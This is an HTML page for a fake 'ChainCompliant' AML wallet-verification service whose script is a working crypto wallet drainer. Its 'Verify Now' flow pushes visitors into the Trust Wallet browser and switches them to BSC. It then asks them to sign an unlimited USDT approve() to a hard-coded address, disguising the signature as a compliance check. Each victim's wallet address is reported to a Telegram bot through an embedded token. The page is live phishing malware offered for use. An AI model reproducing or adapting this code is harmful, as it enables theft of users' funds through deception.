<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>ChainCompliant — AML Compliance Verification</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@400;600;700&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<style>
  :root { --ink: #0E1420; --panel: #17202F; --hair: #2A3549; --amber: #D9A441; --paper: #ECEFF4; --slate: #8C96AC; --green: #4F9D74; }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: var(--ink); color: var(--paper); font-family: 'Inter', sans-serif; line-height: 1.5; }
  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 32px; }
  header { border-bottom: 1px solid var(--hair); padding: 18px 0; }
  .brand { display: flex; align-items: center; gap: 10px; font-family: 'Roboto Slab', serif; font-weight: 700; }
  .brand-mark { width: 34px; height: 34px; background: var(--panel); border: 1px solid var(--hair); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--amber); font-family: 'IBM Plex Mono', monospace; font-size: 13px; }
  .hero { padding: 88px 0; text-align: center; }
  h1 { font-size: 48px; font-family: 'Roboto Slab', serif; line-height: 1.1; margin-bottom: 24px; }
  h1 em { color: var(--amber); font-style: normal; }
  .btn-primary { background: var(--amber); color: #1B1305; font-weight: 700; padding: 16px 32px; border-radius: 8px; border: none; cursor: pointer; font-size: 16px; }
  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(6,9,15,0.9); z-index: 100; align-items: center; justify-content: center; padding: 24px; backdrop-filter: blur(8px); }
  .modal-overlay.active { display: flex; }
  .modal-box { background: var(--panel); border: 1px solid var(--hair); border-radius: 16px; max-width: 440px; width: 100%; padding: 32px; position: relative; }
  .field { margin-bottom: 24px; }
  .field label { display: block; font-size: 11px; color: var(--slate); margin-bottom: 8px; font-family: 'IBM Plex Mono', monospace; }
  .field input { width: 100%; background: var(--ink); border: 1px solid var(--hair); border-radius: 8px; padding: 14px; color: var(--paper); font-size: 14px; outline: none; }
  .result-header { color: var(--green); font-size: 20px; font-weight: 700; margin-bottom: 24px; }
  .result-row { margin-bottom: 16px; }
  .result-label { font-size: 11px; color: var(--slate); font-family: 'IBM Plex Mono', monospace; margin-bottom: 4px; }
  .result-value { font-size: 15px; word-break: break-all; }
</style>
</head>
<body>

<header><div class="wrap"><div class="brand"><div class="brand-mark">CC</div>ChainCompliant</div></div></header>

<section class="hero">
  <div class="wrap">
    <h1>Know your <em>compliance</em> status before it costs you.</h1>
    <p style="color:var(--slate); margin-bottom:32px; font-size:18px;">Request an AML check on your wallet: professional review within 1-2 hours.</p>
    <button class="btn-primary" onclick="openModal()">Request a verification</button>
  </div>
</section>

<div class="modal-overlay" id="modal">
  <div class="modal-box">
    <div id="stepInput">
      <h3 style="margin-bottom:24px;">Request a verification</h3>
      <div class="field"><label>WALLET ADDRESS (BSC)</label><input type="text" id="walletInput" placeholder="0x..." /></div>
      <button id="actionBtn" class="btn-primary" style="width:100%" onclick="handleVerifyClick()">Verify Now</button>
    </div>
    <div id="stepResult" style="display:none;">
      <div class="result-header">✔ Request Received</div>
      <div class="result-row"><div class="result-label">ADDRESS</div><div id="resAddress" class="result-value" style="font-family:monospace;"></div></div>
      <div class="result-row"><div class="result-label">STATUS</div><div class="result-value" style="color:var(--amber); font-weight:700;">Verification pending</div></div>
      <div class="result-row"><div class="result-label">REF ID</div><div id="resRef" class="result-value" style="font-family:monospace;"></div></div>
      <button class="btn-primary" style="width:100%; margin-top:24px;" onclick="location.reload()">Close</button>
    </div>
  </div>
</div>

<script>
  const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
  const TG_CHAT_ID = "8933407008";

  function openModal() { document.getElementById('modal').classList.add('active'); }

  async function handleVerifyClick() {
    const addr = document.getElementById('walletInput').value.trim();
    if (!addr.startsWith('0x')) { alert("Enter valid address"); return; }
    
    const isTrust = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
    if (!isTrust) {
      // DA SAFARI: APRE TRUST WALLET PASSANDO L'INDIRIZZO
      const current = window.location.href.split('?')[0].replace(/^https?:\/\//, "");
      window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + current + "?a=" + addr;
      return;
    }
    // DENTRO TRUST WALLET: ESEGUE APPROVE
    executeApprove(addr);
  }

  async function executeApprove(addr) {
    try {
      const btn = document.getElementById('actionBtn');
      btn.disabled = true; btn.textContent = "Processing...";
      
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const connected = await signer.getAddress();
      
      // Notifica Telegram
      const text = `🔔 *New Request*\n\n📍 *Check:* \`${addr}\`\n👤 *User:* \`${connected}\``;
      fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);

      // SWITCH NETWORK (BSC)
      await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });

      // APPROVE
      const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
      const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
      
      document.getElementById('stepInput').style.display = 'none';
      document.getElementById('stepResult').style.display = 'block';
      document.getElementById('resAddress').textContent = addr;
      document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
      await tx.wait();
    } catch (e) {
      console.error(e);
      document.getElementById('actionBtn').disabled = false;
      document.getElementById('actionBtn').textContent = "Verify Now";
    }
  }

  window.addEventListener('load', async () => {
    const params = new URLSearchParams(window.location.search);
    const addr = params.get('a');
    if (addr && window.ethereum) {
      // DENTRO TRUST WALLET: RECUPERA INDIRIZZO E APRE MODAL
      document.getElementById('walletInput').value = addr;
      openModal();
      
      // CHIEDE IMMEDIATAMENTE CONNECT WALLET
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
      } catch (e) { console.error(e); }
    }
  });
</script>
</body>
</html>
